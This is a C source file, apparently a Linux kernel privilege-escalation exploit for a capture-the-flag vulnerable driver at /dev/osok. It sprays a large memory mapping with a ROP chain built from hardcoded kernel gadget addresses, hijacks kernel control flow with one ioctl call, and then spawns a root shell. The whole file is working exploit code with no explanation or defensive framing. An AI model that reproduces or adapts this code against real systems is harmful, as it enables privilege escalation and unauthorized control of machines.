#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>

long long jmp_rdi = 0xffffffff8140d87d;
long long ret_gadget = 0xffffffff810001cc;

int dev_fd;

struct cfh
{
    long long _rax;
    long long _rbx;
    long long _rcx;
    long long _rdx;
    long long _rsi;
    long long _rdi;
    long long _rsp;
    long long _rbp;
    long long _r8;
    long long _r9;
    long long _r10;
    long long _r11;
    long long _r12;
    long long _r13;
    long long _r14;
    long long _r15;
    long long _rip;
};

void init_dev()
{
    dev_fd = open("/dev/osok", 0);
    if (dev_fd < 0)
    {
        perror("open");
        exit(1);
    }
}

void one_shot(struct cfh *arg)
{
    if (ioctl(dev_fd, 1337, arg) < 0)
    {
        perror("gg");
        return;
    }
}

void get_shell()
{
    int i = 0;
    while (1)
    {
        if (getuid() == 0)
        {
            break;
        }
        usleep(10000);
        printf("try again %d\n", i++);
    }
    printf("Got root\n");
    setuid(0);
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "mov %0,%%cs\n"
        "mov %1,%%ss\n"
        "pushfq\n"
        "pop %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void spray()
{
    //mmap 256M
    long *a = mmap(NULL, 0x10000000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if ((long)a == -1)
    {
        printf("mmap failed\n");
        perror("mmap");
        exit(-1);
    }
    char *mapping_base = (char *)a;
    int i, j;
    for (i = 0; i < 0xf000000; i += 0x1000)
    {
        *(long long *)&mapping_base[i + 0x20] = 0xffffffff8128a5de;                 //first call
        *(long long *)&mapping_base[i + 0x28] = 0xffffffff814b440a;                 //second call
        *(long long *)&mapping_base[i + 0x30] = 0xffff88806d400000 + 0x800 - 5 * 8; // rdi

        long long poprdiret = 0xffffffff810013c9;

        long long native_write_cr4 = 0xffffffff81050e02;

        long long prepare_kernel_cred = 0xffffffff81087130;
        long long commit_creds = 0xffffffff81086e20;

        long long xor_edi = 0xffffffff810480e0;
        long long mov_rdi_rax = 0xffffffff813abe09;

        long long pop_rcx = 0xffffffff8106b812;

        long long pause = 0xffffffff8106fea0;
        long long yield = 0xffffffff81a7bd30;
        long long mysti = 0xffffffff8101c579;
        long long cli2 =   0xffffffff81069434;
        long long mycli = 0xffffffff81040caa;
        long long irq_exit = 0xffffffff810693a0;
        long long do_exit = 0xffffffff81066830;
        long long zerorax = 0xffffffff810a6b22;
        long long star = 0xffffffff810cc34b;
        long long add_rax_rdi = 0xffffffff8100774e;
        long long xor_esi = 0xffffffff811e3305;
        long long sysretq = 0xffffffff81c0015f;
        long long swapgs = 0xffffffff81c00d5a;
        long long iretq = 0xffffffff810232f2;
        long long msleep = 0xffffffff810d2cf0;
        long long sysgetpid = 0xffffffff81076a60;
        long long get_pid_task = 0xffffffff81082bc0;
        long long yield_forever = 0xffffffff81068d40;
        long long pop_rbx =  0xffffffff810003d7;
        long long pop6 = 0xffffffff810013c0;
        long long find_vpid = 0xffffffff81082d80;
        unsigned long long rop_chain[] = {
            poprdiret,
            getpid(),
            find_vpid,
            xor_edi,
            mov_rdi_rax,
            xor_esi,
            get_pid_task,
            poprdiret,
            0x628,
            add_rax_rdi,
            star,
            poprdiret,
            4,
            add_rax_rdi,
            zerorax,
            0xffffffff8100dae7,
            1,
            pop6,
            0xffff88807bec8800,
            0xb,
            1,
            0xffffc90000003f6c,
            0,
            1,
            0xffffffff810007c6,
            0xffffc90000003f20,
            };
        memcpy(&mapping_base[i + 0x800], rop_chain, sizeof(rop_chain));
    }
}


int main(void)
{
    save_state();
    init_dev();
    spray();
    struct cfh mycfh;
    printf("My pid: %d\n", getpid());
    memset(&mycfh, 0, sizeof(struct cfh));
    long long _rdi = 0xffff88806d400000;
    long long regcache_mark_dirty = 0xffffffff81608250;
    mycfh._rip = regcache_mark_dirty;
    mycfh._rdi = _rdi;
    one_shot(&mycfh);
    get_shell();
}

